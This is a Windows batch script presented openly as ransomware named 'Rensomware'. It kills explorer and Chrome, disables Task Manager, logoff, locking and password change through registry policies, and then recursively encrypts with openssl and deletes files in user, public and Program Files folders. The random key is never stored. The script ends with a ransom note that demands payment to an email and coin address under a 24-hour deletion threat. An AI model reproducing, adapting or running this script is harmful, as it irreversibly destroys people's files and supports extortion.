@echo off


title Rensomware
set openssl=%USERPROFILE%\r\openssl.exe
set randmaskey=%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
taskkill /f /IM explorer.exe
taskkill /f /IM chrome.exe
:: taskkill /f /IM firefox.exe 
move %USERPROFILE%\Rensomware\Rensomware_wallpaper.bmp %USERPROFILE%\AppData\Local
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v NoLogoff /t REG_DWORD /d 1 /f 
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f 
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f 
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f 
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %USERPROFILE%\AppData\Local\Rensomware.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
:: Below is taken and modified from yandere chans ftp
cd %USERPROFILE%\Downloads
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd %USERPROFILE%\Documents
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd C:\Users\Public\Videos
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd "C:\Users\Public\Videos\Sample Videos"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd C:\Users\Public\Music
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd "C:\Users\Public\Music\Sample Music"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd %USERPROFILE%\Desktop
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd C:\Users\Public\Pictures
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd "C:\Users\Public\Pictures\Sample Pictures"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd "C:\Program Files"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
cd "C:\Program Files (x86)"
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey% && del /f %%i
:: All this shit is needed to make the COM1 screen filled up so it looks legit.
echo Oops! Your important files have been encrypted with the Rensomware! > COM1
echo What can you do to get them back you ask? > COM1
echo Just enter your personal identity key and send it to this email: rensiyko78@gak.ru
echo And also, you must send 1,000$ worth of RenCoin address: Rz2nmev9ZzArAYabade9UnENDKvAdNxL8b > COM1
echo PERSONAL IDENTIFICATION KEY: %random%%random%%random%%random%-%random%%random%%random%%random%-%random%%random%%random%%random%-%random%%random%%random%%random%-%random%%random%%random%%random% > COM1
echo If you try to look up things on how to disable this ransomware Ware, > COM1
echo You will not find ANYTHING! > COM1
echo So do not try! > COM1
echo There are NO exploits in this program! > COM1
echo It is unhackable, Like SocketBBS, > COM1
echo Once the key is sent to your EMAIL Addresss > COM1
echo You will recieve the decryption key > COM1
echo Which you will enter below this PROGRAM! > COM1
echo If you do not enter the key within 24 hours > COM1
echo All your personal files will be deleted! > COM1
echo And the computer data files wiped > COM1
echo This is your only chance to get your files back! > COM1
echo Good luck > COM1
echo Good bye > COM1
echo And FUCK! > COM1

cd %USERPROFILE%\Rensomware
for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.Rensomware -k %randmaskey%
